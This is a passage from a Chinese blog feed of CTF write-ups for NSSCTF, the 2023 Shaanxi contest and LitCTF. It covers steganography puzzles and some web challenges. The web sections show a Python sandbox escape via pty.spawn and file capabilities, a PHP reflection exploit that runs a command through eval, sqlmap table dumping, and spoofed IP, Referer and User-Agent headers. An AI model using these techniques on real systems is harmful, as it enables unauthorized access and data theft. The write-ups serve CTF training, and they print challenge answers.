alt="image-20230603184810342"></p><p>解压压缩包 得到一段文字 复制一段上网搜索 得知是阴阳怪气编码 <a href="https://mmdjiji.gitee.io/yygq.js/">阴阳怪气编码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603185021897.png" alt="image-20230603185021897"></p><p><strong>:hot_pepper:NSSCTF{W@t3rMaRk_1s_s0000000_35s9}</strong></p><h2 id="坏东西-嵌套压缩包"><a href="#坏东西-嵌套压缩包" class="headerlink" title="坏东西(嵌套压缩包)"></a>坏东西(嵌套压缩包)</h2><p>拿到一个压缩包99020.zip 验证后发现不是伪加密 爆破得到密码就是99020</p><p>里面有一个压缩包 压缩包里面还有压缩包 猜测压缩包名前的数字就是每个压缩包的解压密码 写脚本 解压</p><pre><code class="python">import zipfilename = &#39;99020&#39;while True:    fz = zipfile.ZipFile(name + &#39;.zip&#39;, &#39;r&#39;)    fz.extractall(pwd=bytes(name, &#39;utf-8&#39;))    name = fz.filelist[0].filename.rstrip(&#39;.zip&#39;)    print(fz.filelist[0].filename)    fz.close()</code></pre><p>得到一个损坏的flag.pdf  放在010editor里面发现flag被拆分藏在 &#x2F;Filter&#x2F;FlateDecode里面 一点点手撸吧。。。</p><p><strong>NSSCTF{25da50b7993c0db55867a5a51f32f35c}</strong></p><h2 id="奇怪的tex文件-提取包含文件"><a href="#奇怪的tex文件-提取包含文件" class="headerlink" title="奇怪的tex文件(提取包含文件)"></a>奇怪的tex文件(提取包含文件)</h2><p>首先 了解一下tex文件</p><pre><code>TeX 文件是使用自己的标记语言编写的采用 ASCII 编码的纯文本文件。 它们可能需要包含其他数据，例如图像或其他LaTeX文件。 此类文件通常需要特定的软件才能使用它们。(比如cm3d2/com3d2)</code></pre><p>注意：里面提到了可能需要包含其他文件 这是本题的关键 </p><p>放在010editor里面查看 从第65个十六进制字符开始到每个文件尾 都是一个png图片 将其提取出来 </p><pre><code class="python">import osdef extract_png_from_folder(folder_path):    file_paths = [os.path.join(folder_path, file) for file in os.listdir(folder_path) if                  os.path.isfile(os.path.join(folder_path, file))]    for file_path in file_paths:        with open(file_path, &#39;rb&#39;) as file:            file_data = file.read()        # 找到PNG图片的起始位置        png_start = file_data.find(b&#39;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&#39;)        while png_start != -1:            # 找到PNG图片的结束位置            png_end = file_data.find(b&#39;\x49\x45\x4E\x44\xAE\x42\x60\x82&#39;, png_start)            if png_end != -1:                # 提取PNG图片的数据                png_data = file_data[png_start:png_end + 8]                # 保存PNG图片                output_file_path = os.path.splitext(file_path)[0] + &#39;.png&#39;                with open(output_file_path, &#39;wb&#39;) as output_file:                    output_file.write(png_data)                print(f&#39;Saved PNG image from &#123;file_path&#125; to &#123;output_file_path&#125;&#39;)                # 继续查找下一个PNG图片的起始位置                png_start = file_data.find(b&#39;\x89\x50\x4E\x47\x0D\x0A\x1A\x0A&#39;, png_end)            else:                break# 存放这44个文件的文件夹路径folder_path = &#39;E:/Desktop/nss misc专项/奇怪的tex文件/Tex&#39;extract_png_from_folder(folder_path)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604095535749.png" alt="image-20230604095535749"></p><p>最后将字符进行拼接得到flag <strong>:horse:NSSCTF{fine!it_1s_ez_f0rU_a_MISCmaster_todo}</strong></p><h2 id="strange-python-jail-沙箱逃逸"><a href="#strange-python-jail-沙箱逃逸" class="headerlink" title="strange python (jail 沙箱逃逸)"></a>strange python (jail 沙箱逃逸)</h2><p>拿到一个python shell</p><p>首先dir()查看shell的内置变量 看到<code>__flag__</code> random seed shuffle</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604204936922.png" alt="image-20230604204936922"></p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p><code>__flag__</code>应该是flag按照seed确定的顺序 使用shuffle函数进行了乱序  那么可以 <strong>伪随机预测+列表伪随机打乱后还原</strong></p><pre><code class="python">import randomimport re__flag__ = [&#39;a6&#39;, &#39;5f&#39;, &#39;70&#39;, &#39;SC&#39;, &#39;-4&#39;, &#39;7-&#39;, &#39;3d&#39;, &#39;7e&#39;, &#39;a2&#39;, &#39;NS&#39;, &#39;b4&#39;, &#39;f6&#39;, &#39;6&#125;&#39;, &#39;TF&#39;, &#39;-7&#39;, &#39;1a&#39;, &#39;22&#39;, &#39;06&#39;, &#39;c0&#39;, &#39;c5&#39;, &#39;&#123;4&#39;, &#39;0-&#39;]seed = 114514b = []for i in range(22):    b.append(i)print(b)random.seed(seed)random.shuffle(b)print(b)for i in range(22):    print(__flag__[b.index(i)], end=&quot;&quot;)# [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21]# [18, 19, 20, 1, 10, 12, 14, 17, 4, 0, 13, 11, 21, 2, 15, 8, 9, 16, 5, 6, 3, 7]# NSSCTF&#123;4a2c0c50-1a22-4f67-b43d-7067ea65f706&#125;</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p><strong>利用python的特殊权限态进行文件读取</strong></p><p>先通过python得到一个交互式的shell</p><pre><code class="python">&gt;&gt;&gt; import pty;pty.spawn(&quot;/bin/bash&quot;)import pty;pty.spawn(&quot;/bin/bash&quot;)ctf@61d8d57653564e1a:/$</code></pre><p>通过资料，可以得知在python启动交互式终端的时候，会读取<code>PYTHONSTARTUP</code>这一环境变量作为shell启动时的预先加载脚本，那么说明<code>__flag__</code>的加载逻辑肯定在预先加载脚本内：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210108219.png" alt="image-20230604210108219"></p><p>但是在读取这个文件的时候 发现需要root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210256502.png" alt="image-20230604210256502"></p><p>但是python可以读取 因为发现该题目中python有特殊权限</p><pre><code>ctf@61d8d57653564e1a:/$ getcap -r / 2&gt;/dev/null  /usr/bin/python3.10 cap_dac_override=ep</code></pre><p>所以可以用python直接进行脚本读取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604210502189.png" alt="image-20230604210502189"></p><p><strong>:horse:NSSCTF{4a2c0c50-1a22-4f67-b43d-7067ea65f706}</strong></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><strong>了解一下import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)</strong></p><p>pty.spawn用于创建一个伪终端环境 或者说交互式的终端环境  用于执行命令行程序或模拟终端用户与其他程序进行交互的场景。</p><p>该函数运行了&#x2F;bin&#x2F;bash 命令 可以进入一个新的bash shell环境 可以在其中执行命令 与其交互</p><p><strong>env：在linux系统中用来显示当前用户的变量 即环境变量</strong></p><p><font color="red"> getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</font>该命令可以查看linux系统中所有存在特殊权限(capabilities)的文件</p><h2 id="ability-jail-沙箱逃逸"><a href="#ability-jail-沙箱逃逸" class="headerlink" title="ability(jail 沙箱逃逸)"></a>ability(jail 沙箱逃逸)</h2><p>题目提示和linux中的特权(capabilities)有关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212459122.png" alt="image-20230604212459122"></p><p>想查看flag 但发现没有权限  开始寻找该linux在什么文件中设置了特权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212551027.png" alt="image-20230604212551027"></p><p>于是使用dig程序 无视文件的权限设置 读取flag 在读取过程中 会将flag的内容一起读出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230604212924138.png" alt="image-20230604212924138"></p><p><strong>:horse:NSSCTF{d4ff2964-dd1b-453d-a2d3-d00a85ee68cd}</strong></p><h3 id="dig程序"><a href="#dig程序" class="headerlink" title="dig程序"></a>dig程序</h3><p>在 Linux 系统中，<code>dig</code> 是一个常用的命令行工具，用于执行 <strong>DNS（Domain Name System）查询</strong> 从DNS服务器中获取域名等相关信息。</p><p>具体来说，<code>dig</code> 的作用如下：</p><ol><li>DNS 查询：<code>dig</code> 命令用于执行 DNS 查询，包括查找域名的 IP 地址、反向查找 IP 地址的域名、获取 DNS 记录等。</li><li>命令行界面：<code>dig</code> 提供了一个命令行界面，使用户可以直接在终端中输入命令并获取 DNS 查询结果。</li><li>支持多种查询类型：<code>dig</code> 支持多种 DNS 查询类型，如 A、AAAA、CNAME、MX、TXT、NS、PTR 等，可根据需求执行不同类型的查询。</li><li>详细信息输出：<code>dig</code> 在执行查询时，会输出详细的信息，包括查询结果、响应时间、查询状态等，便于用户进行分析和调试。</li></ol><p>在 <code>dig</code> 命令中，**<code>-f</code>** 选项用于指定包含要查询的域名列表的文件。</p><p>具体来说，<code>-f</code> 选项的含义如下：</p><ul><li><code>-f &lt;filename&gt;</code>: 指定包含要<strong>查询的域名列表的文件名</strong>。<strong>该文件应该是一个文本文件</strong>，每行包含一个域名，<code>dig</code> 命令将逐行读取该文件并对每个域名执行查询操作。使用 <code>-f</code> 选项可以方便地对多个域名进行批量查询，而不需要手动输入每个域名。这在一次性查询多个域名的情况下特别有用，例如从文件中读取要查询的域名列表。</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年陕西省赛</title>
      <link href="/2023/06/03/2023%E5%B9%B4%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/"/>
      <url>/2023/06/03/2023%E5%B9%B4%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="2023年陕西省赛"><a href="#2023年陕西省赛" class="headerlink" title="2023年陕西省赛"></a>2023年陕西省赛</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>先看题目提示 是lsb 直接使用stegsolve进行信息提取</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093430165.png" alt="image-20230603093430165"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093447923.png" alt="image-20230603093447923"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093506785.png" alt="image-20230603093506785"></p><p>虽然图片阴影比较多 但还是可以在red green blue的0通道上看到明显的痕迹 说明这三个通道上都有信息隐藏</p><p>但其实三个通道上信息都是一样的 都是正确的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230603093623882.png" alt="image-20230603093623882"></p><p><strong>:horse:flag{0988f2a657d8936a76876d4f39f7d7a0}</strong></p><h3 id="可是雪啊飘进双眼-snow隐写"><a href="#可是雪啊飘进双眼-snow隐写" class="headerlink" title="可是雪啊飘进双眼(snow隐写)"></a>可是雪啊飘进双眼(snow隐写)</h3><p>在hint.wav后面发现摩斯电码  解码结果是WOAISHANXI </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606193304876.png" alt="image-20230606193304876"></p><p>将snow.txt放进010editor中观察 发现在行间出现大量可疑空格 且重复出现16进制码的20 09</p><p>考虑<strong>snow隐写</strong>  WOAISHANXI应该是密码</p><pre><code>snow隐写是由空格、制表符、回车等不可见字符组成的隐写原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606194753343.png" alt="image-20230606194753343"></p><p>得到<code>shanxiroujiamo</code> 为压缩包密码 得到hide.jpg和key.jpg</p><p>binwalk分离key.jpg得到2.jpg 对比key.jpg 得到解密内容为：BC1PVEYD</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606200018725.png" alt="image-20230606200018725"></p><p><strong>flag{d2d2835882495f4e39ecce6847e78f86}</strong></p><h3 id="findme-crc块异常-vc容器加密-gimp查看图片"><a href="#findme-crc块异常-vc容器加密-gimp查看图片" class="headerlink" title="findme(crc块异常 vc容器加密 gimp查看图片)"></a>findme(crc块异常 vc容器加密 gimp查看图片)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606211521662.png" alt="image-20230606211521662"></p><p>在图片下方 观察到明显的异常色块  在010editor打开 发现了crc块有问题 </p><p>使用tweakpng工具 先导出异常部分 再删去 保存图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611090854614.png" alt="image-20230611090854614"></p><p><font color="red">删掉unknow1前面这部分IDAT头</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611091057859.png" alt="image-20230611091057859"></p><p>得到 unkonwn和key_修正.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606211856015.png" alt="image-20230606211856015"></p><p>整数大小 猜测是vc容器 使用key_修正.png做密钥进行挂载  得到flag.txt   全是0和255</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606212008217.png" alt="image-20230606212008217"></p><pre><code class="python">with open(&#39;E:/Desktop/2023 陕西省赛/find/flag/flag.txt&#39;, &#39;r&#39;) as file:    data = file.read()hex_data = &#39;&#39;.join([hex(int(value))[2:].zfill(2) for value in data.split(&#39;,&#39;)])print(hex_data)with open(&#39;flag_hex.txt&#39;, &#39;w&#39;) as f:    f.write(bytes.fromhex(hex_data))</code></pre><p>转化为16进制 将文件的后缀改为.data 放进gimps 转化为二维码 手动扫一下  <font color="red">注意 最后的结果编码一定要是ascii 不能是utf-8 不然转出来的二维码会有问题</font></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230611093527975.png" alt="image-20230611093527975"></p><p><strong>:horse:flag{a95e34a30d135c2d32f46f3834872f37}</strong></p><h3 id="你是不是很疑惑呢-aztec条形码"><a href="#你是不是很疑惑呢-aztec条形码" class="headerlink" title="你是不是很疑惑呢(aztec条形码)"></a>你是不是很疑惑呢(aztec条形码)</h3><p>这39张码都是一样的<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222427342.png" alt="image-20230606222427342"></p><p><strong>aztec码</strong> 找个在线工具扫一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222548677.png" alt="image-20230606222548677"></p><p><a href="https://products.aspose.app/barcode/zh-hans/recognize/aztec#/recognized">aztec条形码在线阅读</a></p><p><strong>an inch of {TIME} is an inch of gold, an inch of gold cannot buy an inch of {TIME}</strong></p><p>提示在图片的创建时间上有文章</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222819401.png" alt="image-20230606222819401"></p><p><strong>日期转时间戳再异或 将异或的结果按ascii码转为字符</strong></p><pre><code class="python">import osimport redef chinese_to_arabic(chinese_number):    mapping = &#123;        &#39;零&#39;: 0,        &#39;壹&#39;: 1,        &#39;贰&#39;: 2,        &#39;叁&#39;: 3,        &#39;肆&#39;: 4,        &#39;伍&#39;: 5,        &#39;陆&#39;: 6,        &#39;柒&#39;: 7,        &#39;捌&#39;: 8,        &#39;玖&#39;: 9,        &#39;拾&#39;: 10,    &#125;    pattern = re.compile(r&#39;[零壹贰叁肆伍陆柒捌玖拾佰仟万亿]&#39;)    matches = pattern.findall(chinese_number)    total = 0    current = 0    for char in matches:        value = mapping[char]        if value &gt;= 10:            if current == 0:                current = value            else:                current *= value        else:            current += value            if current &gt;= 10:                total += current                current = 0    return total + current# 获取当前目录路径folder_path = &#39;E:/Desktop/2023 陕西省赛/out/out&#39;# 获取当前目录下的所有文件名file_names = os.listdir(folder_path)# print(file_names)# 仅保留后缀为 .png 的文件名，并将中文数字转换为阿拉伯数字number_file_mapping = &#123;&#125;for filename in file_names:    if filename.endswith(&#39;.png&#39;):        chinese_num = filename.split(&#39;.&#39;)[0]        number = chinese_to_arabic(chinese_num)        number_file_mapping[number] = filename# 按数字的大小顺序遍历文件名sorted_numbers = sorted(number_file_mapping.keys())for number in sorted_numbers:    filename = number_file_mapping[number]    file_path = os.path.join(folder_path, filename)    # 获取文件的创建时间和修改时间的时间戳    create_time = int(os.path.getctime(file_path))    modify_time = int(os.path.getmtime(file_path))    # 异或运算    xor_result = create_time ^ modify_time    xor_result = xor_result % 0x110000    print(chr(xor_result),end=&#39;&#39;)# flag&#123;Tim3_1s_a_w0nd3rfuL_Th1ng_alright&#125;</code></pre><h2 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h2><h3 id="被销毁的flag"><a href="#被销毁的flag" class="headerlink" title="被销毁的flag"></a>被销毁的flag</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606222936551.png" alt="image-20230606222936551"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223001126.png" alt="image-20230606223001126"></p><p>发现destroy 即为被删除的部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223101100.png" alt="image-20230606223101100"></p><p>点开method为destroy的部分  在detail里面没有有效信息</p><p>再点开下面的部分 在detail里面找到一串hex码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223249791.png" alt="image-20230606223249791"></p><p>使用utf-8的编码方式 发现flag  在进行一下拼接 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230606223356008.png" alt="image-20230606223356008"></p><p><strong>flag{S0met1m4s_d4t0ry_c4n_n0t_d4t0ry}</strong></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="unserialize-反射机制-unicode不可见字符"><a href="#unserialize-反射机制-unicode不可见字符" class="headerlink" title="unserialize(反射机制 unicode不可见字符 )"></a>unserialize(反射机制 unicode不可见字符 )</h3><p>题目代码</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);header(&quot;Content-type:text/html;charset=utf-8&quot;);require_once &quot;waf.php&quot;;error_reporting(0);class getFlag&#123;    private $password;    private $cmd;    public function __destruct()&#123;        if($this-&gt;password==&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;)&#123;            system($this-&gt;cmd);        &#125;    &#125;&#125;$a = $_GET[&#39;a&#39;];if(isset($_GET[&#39;a&#39;]))&#123;    @eval(waf($a));&#125;?&gt;</code></pre><p>使用dirsearch扫出robots.txt</p><pre><code class="python"> python dirsearch.py -e php -u http://f74888d8.clsadp.com/</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612162333204.png" alt="image-20230612162333204"></p><p>转到 hint.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612162441417.png" alt="image-20230612162441417"></p><p>得到提示<code>you can use these(getProperty、ReflectionObject、getFlag、getProperty、setAccessible、setValue)function</code></p><pre><code>这行代码使用require_once语句导入了一个名为&quot;waf.php&quot;的文件 waf.php很可能包含一些用与过滤和检查输出的代码 当类getFlag被创建的时候，在触发销毁函数的时候，经过if判断，判断成功可以执行cmd命令，但是password和cmd是private私有变量，发现eval函数，传入参数a，a传递的php代码可以被执行 结合题意和提示 waf.php是用于检测a传入的php代码是否只使用了提示包含的函数 @符号用于抑制可能产生的错误消息。</code></pre><p><font color="red">可以利用反射机制来绕过私有成员变量的访问限制</font></p><p>编写exp</p><pre><code>$flag=new getFlag();$reflection = new ReflectionObject($flag);$property = $reflection-&gt;getProperty(&#39;password&#39;);$property-&gt;setAccessible(true);$property-&gt;setValue($flag, &quot;‮⁦  //how to change the private variables⁩⁦secret&quot;);$property = $reflection-&gt;getProperty(&#39;cmd&#39;);$property-&gt;setAccessible(true);$property-&gt;setValue($flag, &quot;cat flag&quot;);</code></pre><p>放在vscode中还能看到不可见字符(unicode)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612200327300.png" alt="image-20230612200327300"></p><p>将exp作为a的内容以get方式传入 得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230612202606059.png" alt="image-20230612202606059"></p><p><strong>flag{5e711db64425e99fcaf6020a8a3c9afb}</strong></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF一些题解</title>
      <link href="/2023/05/19/LitCTF%E4%B8%80%E4%BA%9B%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/05/19/LitCTF%E4%B8%80%E4%BA%9B%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="LitCTF一些题解"><a href="#LitCTF一些题解" class="headerlink" title="LitCTF一些题解"></a>LitCTF一些题解</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h3><p>F12 在源代码中找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155006089.png" alt="image-20230519155006089"></p><p><strong>NSSCTF{y0u_w1n_th1s_!!!}</strong></p><h3 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h3><p>bp使用repeater看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155501335.png" alt="image-20230519155501335"></p><p><strong>NSSCTF{6ea58035-0f11-4048-ad1d-39be33c5d5c6}</strong></p><p>同时在网站的控制台处可以找到第一个彩蛋</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155800019.png" alt="image-20230519155800019"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519155809078.png" alt="image-20230519155809078"></p><p><strong>LitCTF{First_t0_The_k3y!</strong></p><h3 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h3><p>简单的hackbar的使用 用post和get方法分别进行传参</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519160049607.png" alt="image-20230519160049607"></p><p><strong>NSSCTF{957f8756-66e3-45d2-9e1c-bcf6dd96c2ee}</strong></p><p>常见的网站备份文件名都试一下</p><p>发现输入<a href="http://www.zip可以进行下载/">www.zip可以进行下载</a> 下载后得到备份文件index.php.bak</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519163046047.png" alt="image-20230519163046047"></p><p>得到第三个彩蛋</p><pre><code>_R3ady_Pl4yer_000ne_</code></pre><h3 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519165142849.png" alt="image-20230519165142849"></p><p>在网页下方可以看到传入id参数的sql语句</p><p>尝试输入1、2等 直接看到了第四个彩蛋</p><p><strong>F1rst_to_Th3_eggggggggg!}</strong> </p><p>使用sqlmap进行一个梭</p><pre><code class="python">python sqlmap url --dbspython sqlmap url -D ctftraining -T flag -C &quot;flag&quot; --dump</code></pre><p>得到<strong>NSSCTF{9ff959f5-1a7e-484a-8295-225ca817bef1}</strong></p><h3 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h3><p>给了探姬的博客<a href="https://probiusofficial.github.io/">https://ProbiusOfficial.github.io</a></p><p>那就进去看看 第一篇文章就是题目相关的 “什么是flag ”</p><p>那进入github找到探姬存放数据的库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519182641671.png" alt="image-20230519182641671"></p><p>定位到博客的库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230524211251005.png" alt="image-20230524211251005"></p><p>点击branch</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519182751017.png" alt="image-20230519182751017"></p><p>发现main分支最近更改过  “什么是flag”这篇文章也是最近发布的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183002787.png" alt="image-20230519183002787"></p><p>查看commit 一个commit可以认为是一个改动的节点 进入后查看新提交的commit的位置</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183157172.png" alt="image-20230519183157172"></p><p>在这里有一个红 <font color="red">×</font> 进入后找到“什么是flag呢” 对应的index.html<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519183400263.png" alt="image-20230519183400263"></p><p>找到flag：<strong>LitCTF{g1thub_c0mmit_1s_s0_us3ful}</strong></p><h3 id="Http-pro-max-plus"><a href="#Http-pro-max-plus" class="headerlink" title="Http pro max plus"></a>Http pro max plus</h3><p>考察http协议伪造</p><p>首先，显示只允许本地访问</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519191538249.png" alt="image-20230519191538249"></p><p>使用ip地址欺骗的字典 一键全部复制粘贴</p><pre><code>X-Forwarded-For: 127.0.0.1X-Forwarded: 127.0.0.1X-Forwarded-With:127.0.0.1X-Forwarded-Proto:127.0.0.1X-Forwarded-Host:127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1X-Forwarded-Host: 127.0.0.1X-remote-IP: 127.0.0.1X-remote-addr: 127.0.0.1 True-Client-IP: 127.0.0.1 X-Client-IP: 127.0.0.1Client-IP: 127.0.0.1X-Real-IP: 127.0.0.1Ali-CDN-Real-IP: 127.0.0.1Cdn-Src-Ip: 127.0.0.1Cdn-Real-Ip: 127.0.0.1CF-Connecting-IP: 127.0.0.1X-Cluster-Client-IP: 127.0.0.1 WL-Proxy-Client-IP: 127.0.0.1 Proxy-Client-IP: 127.0.0.1 Fastly-Client-Ip: 127.0.0.1 True-Client-Ip: 127.0.0.1</code></pre><p>第二层 you are not from pornhub.com</p><p>伪造Referer</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192324761.png" alt="image-20230519192324761"></p><p>第三步 用chrome浏览器啊</p><p>伪造User-Agent</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192354974.png" alt="image-20230519192354974"></p><p>第四步 修改代理服务器地址</p><p>伪造via</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519192546047.png" alt="image-20230519192546047"></p><p>提示查看&#x2F;wtfwtfwtfwtf.php</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519193646867.png" alt="image-20230519193646867"></p><p>回显内容并没有用 f12看源代码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519193726024.png" alt="image-20230519193726024"></p><p>转到sejishikong.php</p><p>得到<strong>NSSCTF{6dc39953-2c34-4dde-8217-5a76f14a385f}</strong></p><h4 id="http伪造相关知识"><a href="#http伪造相关知识" class="headerlink" title="http伪造相关知识"></a><strong>http伪造相关知识</strong></h4><p>1.请从本地访问&#x2F;提到ip ip地址欺骗</p><p>2.从什么网址访问 修改Referer</p><p>3.通过什么浏览器访问 修改User-Agent</p><p>4.使用什么代理服务器 修改via</p><p>5.http状态码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519195205508.png" alt="image-20230519195205508"></p><p>6.cookie欺骗 认证 伪造</p><pre><code>cookie机制是在浏览网页的时候，服务器将你的登录信息，浏览信息等发送给客户端并保存一定的时间。当你下一次访问这个网站的时候，就能读取上一次你的记录cookie是一段小型的文本数据是由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。我们只要伪造了这个信息就可以绕过登录页面，直接登录。</code></pre><p><strong>HTTP基本认证</strong></p><p>是允许http用户代理在请求的时候 提供用户名和密码的一种方式</p><p>认证过程:</p><p>1.客户端请求</p><p>2.服务端应答 包含字段WWW-Authenticate: Basic realm&#x3D;”Secure Area”  Basic为验证模式 realm&#x3D;”Secure Area”是保护域</p><p>3.客户端输入用户名和密码 进行处理，在原先的请求上增加认证消息头（Authorization）然后重新发送再次尝试。过程如下：</p><ol><li>将用户名和密码拼接为<code>用户：密码</code>形式的字符串。</li><li>如果服务器<code>WWW-Authenticate</code>字段有指定编码，则将字符串编译成对应的编码（如：UTF-8）。</li><li>将字符串编码为base64。</li><li>拼接<code>Basic</code> ，放入<code>Authorization</code>头字段，就像这样：<code>Authorization Basic 字符串</code>。 示例：用户名：<code>Aladdin</code> ，密码：<code>OpenSesame</code> ，拼接后为<code>Aladdin:OpenSesame</code>，编码后<code>QWxhZGRpbjpPcGVuU2VzYW1l</code>，在HTTP头部里会是这样：<code>Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l</code></li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519200031252.png" alt="image-20230519200031252"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230519200053714.png" alt="image-20230519200053714"></p><p>由此原理 可以对cookie进行爆破 伪造等操作</p><h3 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h3><p>一句话命令</p><p><img 